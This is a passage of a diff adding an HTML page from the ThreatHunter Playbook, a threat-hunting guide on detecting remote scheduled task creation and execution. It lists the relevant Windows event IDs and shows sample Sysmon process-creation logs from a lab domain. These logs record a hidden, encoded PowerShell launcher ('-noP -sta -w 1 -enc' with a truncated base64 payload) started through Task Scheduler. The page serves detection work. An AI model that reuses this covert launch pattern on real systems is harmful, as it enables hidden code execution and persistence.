+        <span class="nt">&lt;Data</span> <span class="na">Name=</span><span class="s">&quot;ParentProcessId&quot;</span><span class="nt">&gt;</span>0<span class="nt">&lt;/Data&gt;</span> 
+        <span class="nt">&lt;Data</span> <span class="na">Name=</span><span class="s">&quot;RpcCallClientLocality&quot;</span><span class="nt">&gt;</span>0<span class="nt">&lt;/Data&gt;</span> 
+        <span class="nt">&lt;Data</span> <span class="na">Name=</span><span class="s">&quot;FQDN&quot;</span><span class="nt">&gt;</span>WORKSTATION6.theshire.local<span class="nt">&lt;/Data&gt;</span> 
+    <span class="nt">&lt;/EventData&gt;</span> 
+<span class="nt">&lt;/Event&gt;</span>
+</pre></div>
+</div>
+<ul class="simple">
+<li><p>EventID 4688 (Target): A New Process Has been created</p></li>
+</ul>
+</div>
+<div class="section" id="microsoft-windows-taskscheduler-operational-logs">
+<h3>Microsoft-Windows-TaskScheduler/Operational Logs<a class="headerlink" href="#microsoft-windows-taskscheduler-operational-logs" title="Permalink to this headline">¶</a></h3>
+<ul class="simple">
+<li><p>EventID 140: Task Rergistration Updated</p></li>
+<li><p>EventID 100: Task Started</p></li>
+<li><p>EventID 201: Action Completed</p></li>
+<li><p>EventID 201: Task Completed</p></li>
+<li><p>EventID 111: Task Terminated</p></li>
+<li><p>EventID 332: Launch request ignored. Instance already running</p></li>
+</ul>
+</div>
+</div>
+<div class="section" id="sysmon">
+<h2>Sysmon<a class="headerlink" href="#sysmon" title="Permalink to this headline">¶</a></h2>
+<ul class="simple">
+<li><p>EventID 1: ProcessCreate (When Task is stopped)</p></li>
+</ul>
+<div class="highlight-xml notranslate"><div class="highlight"><pre><span></span>- <span class="nt">&lt;Event</span> <span class="na">xmlns=</span><span class="s">&quot;http://schemas.microsoft.com/win/2004/08/events/event&quot;</span><span class="nt">&gt;</span> 
+    - <span class="nt">&lt;System&gt;</span> 
+        <span class="nt">&lt;Provider</span> <span class="na">Name=</span><span class="s">&quot;Microsoft-Windows-Sysmon&quot;</span> <span class="na">Guid=</span><span class="s">&quot;{5770385f-c22a-43e0-bf4c-06f5698ffbd9}&quot;</span> <span class="nt">/&gt;</span> 
+        <span class="nt">&lt;EventID&gt;</span>1<span class="nt">&lt;/EventID&gt;</span> 
+        <span class="nt">&lt;Version&gt;</span>5<span class="nt">&lt;/Version&gt;</span> 
+        <span class="nt">&lt;Level&gt;</span>4<span class="nt">&lt;/Level&gt;</span> 
+        <span class="nt">&lt;Task&gt;</span>1<span class="nt">&lt;/Task&gt;</span> 
+        <span class="nt">&lt;Opcode&gt;</span>0<span class="nt">&lt;/Opcode&gt;</span> 
+        <span class="nt">&lt;Keywords&gt;</span>0x8000000000000000<span class="nt">&lt;/Keywords&gt;</span> 
+        <span class="nt">&lt;TimeCreated</span> <span class="na">SystemTime=</span><span class="s">&quot;2020-12-16T17:23:48.196270400Z&quot;</span> <span class="nt">/&gt;</span> 
+        <span class="nt">&lt;EventRecordID&gt;</span>9090341<span class="nt">&lt;/EventRecordID&gt;</span> 
+        <span class="nt">&lt;Correlation</span> <span class="nt">/&gt;</span> 
+        <span class="nt">&lt;Execution</span> <span class="na">ProcessID=</span><span class="s">&quot;3256&quot;</span> <span class="na">ThreadID=</span><span class="s">&quot;4036&quot;</span> <span class="nt">/&gt;</span> 
+        <span class="nt">&lt;Channel&gt;</span>Microsoft-Windows-Sysmon/Operational<span class="nt">&lt;/Channel&gt;</span> 
+        <span class="nt">&lt;Computer&gt;</span>WORKSTATION6.theshire.local<span class="nt">&lt;/Computer&gt;</span> 
+        <span class="nt">&lt;Security</span> <span class="na">UserID=</span><span class="s">&quot;S-1-5-18&quot;</span> <span class="nt">/&gt;</span> 
+    <span class="nt">&lt;/System&gt;</span> 
+    - <span class="nt">&lt;EventData&gt;</span> 
+        <span class="nt">&lt;Data</span> <span class="na">Name=</span><span class="s">&quot;RuleName&quot;</span><span class="nt">&gt;</span>-<span class="nt">&lt;/Data&gt;</span> 
+        <span class="nt">&lt;Data</span> <span class="na">Name=</span><span class="s">&quot;UtcTime&quot;</span><span class="nt">&gt;</span>2020-12-16 17:23:48.185<span class="nt">&lt;/Data&gt;</span> 
+        <span class="nt">&lt;Data</span> <span class="na">Name=</span><span class="s">&quot;ProcessGuid&quot;</span><span class="nt">&gt;</span>{649442b8-42a4-5fda-af62-000000000600}<span class="nt">&lt;/Data&gt;</span> 
+        <span class="nt">&lt;Data</span> <span class="na">Name=</span><span class="s">&quot;ProcessId&quot;</span><span class="nt">&gt;</span>2836<span class="nt">&lt;/Data&gt;</span> 
+        <span class="nt">&lt;Data</span> <span class="na">Name=</span><span class="s">&quot;Image&quot;</span><span class="nt">&gt;</span>C:\Windows\System32\taskhostw.exe<span class="nt">&lt;/Data&gt;</span> 
+        <span class="nt">&lt;Data</span> <span class="na">Name=</span><span class="s">&quot;FileVersion&quot;</span><span class="nt">&gt;</span>10.0.18362.1237 (WinBuild.160101.0800)<span class="nt">&lt;/Data&gt;</span> 
+        <span class="nt">&lt;Data</span> <span class="na">Name=</span><span class="s">&quot;Description&quot;</span><span class="nt">&gt;</span>Host Process for Windows Tasks<span class="nt">&lt;/Data&gt;</span> 
+        <span class="nt">&lt;Data</span> <span class="na">Name=</span><span class="s">&quot;Product&quot;</span><span class="nt">&gt;</span>Microsoft® Windows® Operating System<span class="nt">&lt;/Data&gt;</span> 
+        <span class="nt">&lt;Data</span> <span class="na">Name=</span><span class="s">&quot;Company&quot;</span><span class="nt">&gt;</span>Microsoft Corporation<span class="nt">&lt;/Data&gt;</span> 
+        <span class="nt">&lt;Data</span> <span class="na">Name=</span><span class="s">&quot;OriginalFileName&quot;</span><span class="nt">&gt;</span>taskhostw.exe<span class="nt">&lt;/Data&gt;</span> 
+        <span class="nt">&lt;Data</span> <span class="na">Name=</span><span class="s">&quot;CommandLine&quot;</span><span class="nt">&gt;</span>taskhostw.exe C:\windows\System32\WindowsPowerShell\v1.0\powershell.EXE -noP -sta -w 1 -enc SQBGACgAJABQAFMAVgBFAFIAUwBpAE8ATgBUAGEAQgBMAGUALgBQAFMAVgBlAHIAUwBpAE8AbgAuAE0AYQBqAE8AcgAgAC0AZwBFACAAMwApAHsAJAA4...<span class="nt">&lt;/Data&gt;</span> 
+        <span class="nt">&lt;Data</span> <span class="na">Name=</span><span class="s">&quot;CurrentDirectory&quot;</span><span class="nt">&gt;</span>C:\windows\system32\<span class="nt">&lt;/Data&gt;</span> 
+        <span class="nt">&lt;Data</span> <span class="na">Name=</span><span class="s">&quot;User&quot;</span><span class="nt">&gt;</span>THESHIRE\sbeavers<span class="nt">&lt;/Data&gt;</span> 
+        <span class="nt">&lt;Data</span> <span class="na">Name=</span><span class="s">&quot;LogonGuid&quot;</span><span class="nt">&gt;</span>{649442b8-783d-5fd2-c316-e00000000000}<span class="nt">&lt;/Data&gt;</span> 
+        <span class="nt">&lt;Data</span> <span class="na">Name=</span><span class="s">&quot;LogonId&quot;</span><span class="nt">&gt;</span>0xe016c3<span class="nt">&lt;/Data&gt;</span> 
+        <span class="nt">&lt;Data</span> <span class="na">Name=</span><span class="s">&quot;TerminalSessionId&quot;</span><span class="nt">&gt;</span>2<span class="nt">&lt;/Data&gt;</span> 
+        <span class="nt">&lt;Data</span> <span class="na">Name=</span><span class="s">&quot;IntegrityLevel&quot;</span><span class="nt">&gt;</span>Medium<span class="nt">&lt;/Data&gt;</span> 
+        <span class="nt">&lt;Data</span> <span class="na">Name=</span><span class="s">&quot;Hashes&quot;</span><span class="nt">&gt;</span>SHA1=6630F5E1A1ACC1C8E95A7958542DD87D0735D99B,MD5=52071D9553A92A12F22DDDF6DB6F9643,SHA256=ABCA3394728697205DEAD7C9B7B9076CDD28BEE84E7A3C84514478BC033E531A,IMPHASH=9CB27CAED52CB0AFFB32788922A0D083<span class="nt">&lt;/Data&gt;</span> 
+        <span class="nt">&lt;Data</span> <span class="na">Name=</span><span class="s">&quot;ParentProcessGuid&quot;</span><span class="nt">&gt;</span>{649442b8-52dc-5fd1-3600-000000000600}<span class="nt">&lt;/Data&gt;</span> 
+        <span class="nt">&lt;Data</span> <span class="na">Name=</span><span class="s">&quot;ParentProcessId&quot;</span><span class="nt">&gt;</span>2220<span class="nt">&lt;/Data&gt;</span> 
+        <span class="nt">&lt;Data</span> <span class="na">Name=</span><span class="s">&quot;ParentImage&quot;</span><span class="nt">&gt;</span>C:\Windows\System32\svchost.exe<span class="nt">&lt;/Data&gt;</span> 
+        <span class="nt">&lt;Data</span> <span class="na">Name=</span><span class="s">&quot;ParentCommandLine&quot;</span><span class="nt">&gt;</span>C:\windows\system32\svchost.exe -k netsvcs -p -s Schedule<span class="nt">&lt;/Data&gt;</span> 
+    <span class="nt">&lt;/EventData&gt;</span> 
+<span class="nt">&lt;/Event&gt;</span>
+</pre></div>
+</div>
+<ul class="simple">
+<li><p>EventID 1: ProcessCreate (Execution when task is forced to execute or task is updated)</p></li>
+</ul>
+<div class="highlight-xml notranslate"><div class="highlight"><pre><span></span>- <span class="nt">&lt;Event</span> <span class="na">xmlns=</span><span class="s">&quot;http://schemas.microsoft.com/win/2004/08/events/event&quot;</span><span class="nt">&gt;</span> 
+    - <span class="nt">&lt;System&gt;</span> 
+        <span class="nt">&lt;Provider</span> <span class="na">Name=</span><span class="s">&quot;Microsoft-Windows-Sysmon&quot;</span> <span class="na">Guid=</span><span class="s">&quot;{5770385f-c22a-43e0-bf4c-06f5698ffbd9}&quot;</span> <span class="nt">/&gt;</span> 
+        <span class="nt">&lt;EventID&gt;</span>1<span class="nt">&lt;/EventID&gt;</span> 
+        <span class="nt">&lt;Version&gt;</span>5<span class="nt">&lt;/Version&gt;</span> 
+        <span class="nt">&lt;Level&gt;</span>4<span class="nt">&lt;/Level&gt;</span> 
+        <span class="nt">&lt;Task&gt;</span>1<span class="nt">&lt;/Task&gt;</span> 
+        <span class="nt">&lt;Opcode&gt;</span>0<span class="nt">&lt;/Opcode&gt;</span> 
+        <span class="nt">&lt;Keywords&gt;</span>0x8000000000000000<span class="nt">&lt;/Keywords&gt;</span> 
+        <span class="nt">&lt;TimeCreated</span> <span class="na">SystemTime=</span><span class="s">&quot;2020-12-16T17:40:06.014964400Z&quot;</span> <span class="nt">/&gt;</span> 
+        <span class="nt">&lt;EventRecordID&gt;</span>9103725<span class="nt">&lt;/EventRecordID&gt;</span> 
+        <span class="nt">&lt;Correlation</span> <span class="nt">/&gt;</span> 
+        <span class="nt">&lt;Execution</span> <span class="na">ProcessID=</span><span class="s">&quot;3256&quot;</span> <span class="na">ThreadID=</span><span class="s">&quot;4036&quot;</span> <span class="nt">/&gt;</span> 
+        <span class="nt">&lt;Channel&gt;</span>Microsoft-Windows-Sysmon/Operational<span class="nt">&lt;/Channel&gt;</span> 
+        <span class="nt">&lt;Computer&gt;</span>WORKSTATION6.theshire.local<span class="nt">&lt;/Computer&gt;</span> 
+        <span class="nt">&lt;Security</span> <span class="na">UserID=</span><span class="s">&quot;S-1-5-18&quot;</span> <span class="nt">/&gt;</span> 
+        <span class="nt">&lt;/System&gt;</span> 
+    - <span class="nt">&lt;EventData&gt;</span> 
+        <span class="nt">&lt;Data</span> <span class="na">Name=</span><span class="s">&quot;RuleName&quot;</span><span class="nt">&gt;</span>-<span class="nt">&lt;/Data&gt;</span> 
+        <span class="nt">&lt;Data</span> <span class="na">Name=</span><span class="s">&quot;UtcTime&quot;</span><span class="nt">&gt;</span>2020-12-16 17:40:05.997<span class="nt">&lt;/Data&gt;</span> 
+        <span class="nt">&lt;Data</span> <span class="na">Name=</span><span class="s">&quot;ProcessGuid&quot;</span><span class="nt">&gt;</span>{649442b8-4675-5fda-d962-000000000600}<span class="nt">&lt;/Data&gt;</span> 
+        <span class="nt">&lt;Data</span> <span class="na">Name=</span><span class="s">&quot;ProcessId&quot;</span><span class="nt">&gt;</span>6840<span class="nt">&lt;/Data&gt;</span> 
+        <span class="nt">&lt;Data</span> <span class="na">Name=</span><span class="s">&quot;Image&quot;</span><span class="nt">&gt;</span>C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe<span class="nt">&lt;/Data&gt;</span> 
+        <span class="nt">&lt;Data</span> <span class="na">Name=</span><span class="s">&quot;FileVersion&quot;</span><span class="nt">&gt;</span>10.0.18362.1 (WinBuild.160101.0800)<span class="nt">&lt;/Data&gt;</span> 
+        <span class="nt">&lt;Data</span> <span class="na">Name=</span><span class="s">&quot;Description&quot;</span><span class="nt">&gt;</span>Windows PowerShell<span class="nt">&lt;/Data&gt;</span> 
+        <span class="nt">&lt;Data</span> <span class="na">Name=</span><span class="s">&quot;Product&quot;</span><span class="nt">&gt;</span>Microsoft® Windows® Operating System<span class="nt">&lt;/Data&gt;</span> 
+        <span class="nt">&lt;Data</span> <span class="na">Name=</span><span class="s">&quot;Company&quot;</span><span class="nt">&gt;</span>Microsoft Corporation<span class="nt">&lt;/Data&gt;</span> 
+        <span class="nt">&lt;Data</span> <span class="na">Name=</span><span class="s">&quot;OriginalFileName&quot;</span><span class="nt">&gt;</span>PowerShell.EXE<span class="nt">&lt;/Data&gt;</span> 
+        <span class="nt">&lt;Data</span> <span class="na">Name=</span><span class="s">&quot;CommandLine&quot;</span><span class="nt">&gt;</span>C:\windows\System32\WindowsPowerShell\v1.0\powershell.EXE -noP -sta -w 1 -enc SQBGACgAJABQAFMAVgBFAFIAUwBpAE8ATgBUAGEAQgBMAGUALgBQAFMAVgBlAHIAUwBpAE8AbgAuAE0AYQBqAE8AcgAgAC0AZwBFACAAMwAp...<span class="nt">&lt;/Data&gt;</span> 
+        <span class="nt">&lt;Data</span> <span class="na">Name=</span><span class="s">&quot;CurrentDirectory&quot;</span><span class="nt">&gt;</span>C:\windows\system32\<span class="nt">&lt;/Data&gt;</span> 
+        <span class="nt">&lt;Data</span> <span class="na">Name=</span><span class="s">&quot;User&quot;</span><span class="nt">&gt;</span>THESHIRE\sbeavers<span class="nt">&lt;/Data&gt;</span> 
+        <span class="nt">&lt;Data</span> <span class="na">Name=</span><span class="s">&quot;LogonGuid&quot;</span><span class="nt">&gt;</span>{649442b8-783d-5fd2-c316-e00000000000}<span class="nt">&lt;/Data&gt;</span> 
+        <span class="nt">&lt;Data</span> <span class="na">Name=</span><span class="s">&quot;LogonId&quot;</span><span class="nt">&gt;</span>0xe016c3<span class="nt">&lt;/Data&gt;</span> 
+        <span class="nt">&lt;Data</span> <span class="na">Name=</span><span class="s">&quot;TerminalSessionId&quot;</span><span class="nt">&gt;</span>2<span class="nt">&lt;/Data&gt;</span> 
+        <span class="nt">&lt;Data</span> <span class="na">Name=</span><span class="s">&quot;IntegrityLevel&quot;</span><span class="nt">&gt;</span>Medium<span class="nt">&lt;/Data&gt;</span> 
+        <span class="nt">&lt;Data</span> <span class="na">Name=</span><span class="s">&quot;Hashes&quot;</span><span class="nt">&gt;</span>SHA1=36C5D12033B2EAF251BAE61C00690FFB17FDDC87,MD5=CDA48FC75952AD12D99E526D0B6BF70A,SHA256=908B64B1971A979C7E3E8CE4621945CBA84854CB98D76367B791A6E22B5F6D53,IMPHASH=A7CEFACDDA74B13CD330390769752481<span class="nt">&lt;/Data&gt;</span> 
+        <span class="nt">&lt;Data</span> <span class="na">Name=</span><span class="s">&quot;ParentProcessGuid&quot;</span><span class="nt">&gt;</span>{649442b8-52dc-5fd1-3600-000000000600}<span class="nt">&lt;/Data&gt;</span> 
+        <span class="nt">&lt;Data</span> <span class="na">Name=</span><span class="s">&quot;ParentProcessId&quot;</span><span class="nt">&gt;</span>2220<span class="nt">&lt;/Data&gt;</span> 
+        <span class="nt">&lt;Data</span> <span class="na">Name=</span><span class="s">&quot;ParentImage&quot;</span><span class="nt">&gt;</span>C:\Windows\System32\svchost.exe<span class="nt">&lt;/Data&gt;</span> 
+        <span class="nt">&lt;Data</span> <span class="na">Name=</span><span class="s">&quot;ParentCommandLine&quot;</span><span class="nt">&gt;</span>C:\windows\system32\svchost.exe -k netsvcs -p -s Schedule<span class="nt">&lt;/Data&gt;</span> 
+    <span class="nt">&lt;/EventData&gt;</span> 
+<span class="nt">&lt;/Event&gt;</span>
+</pre></div>
+</div>
+<p>EventID 7: Image Loaded</p>
+<ul class="simple">
+<li><p>taskcomp.dll</p></li>
+<li><p>taskschd.dll</p></li>
+<li><p>wmicmiplugin.dll</p></li>
+</ul>
+</div>
+<div class="section" id="references">
+<h2>References<a class="headerlink" href="#references" title="Permalink to this headline">¶</a></h2>
+<ul class="simple">
+<li><p>https://winprotocoldoc.blob.core.windows.net/productionwindowsarchives/MS-TSCH/%5BMS-TSCH%5D-170915-diff.pdf</p></li>
+<li><p>https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-tsch/eb12c947-7e20-4a30-a528-85bc433cec44</p></li>
+<li><p>https://docs.microsoft.com/en-us/windows/win32/taskschd/displaying-task-names-and-state–scripting-</p></li>
+<li><p>https://docs.microsoft.com/en-us/windows/win32/taskschd/trigger-type</p></li>
+<li><p>https://docs.microsoft.com/en-us/windows/win32/taskschd/tasksettings</p></li>
+</ul>
+</div>
+</div>
+
+    <script type="text/x-thebe-config">
+    {
+        requestKernel: true,
+        binderOptions: {
+            repo: "OTRF/ThreatHunter-Playbook",
+            ref: "master",
+        },
+        codeMirrorConfig: {
+            theme: "abcdef",
+            mode: "python"
+        },
+        kernelOptions: {
+            kernelName: "python3",
+            path: "./library"
+        },
+        predefinedOutput: true
+    }
+    </script>
+    <script>kernelName = 'python3'</script>
+
+              </div>
+              
+        </div>
+    </div>
+    
+    
+    <div class='prev-next-bottom'>
+        
+
+    </div>
+    <footer class="footer mt-5 mt-md-0">
+    <div class="container">
+      <p>
+        
+          By Roberto Rodriguez @Cyb3rWard0g<br/>
+        
+            &copy; Copyright 2020.<br/>
+      </p>
+    </div>
+  </footer>
+</main>
+
+
+      </div>
+    </div>
+
+    <script src="../_static/js/index.js"></script>
+    
+  </body>
+</html>
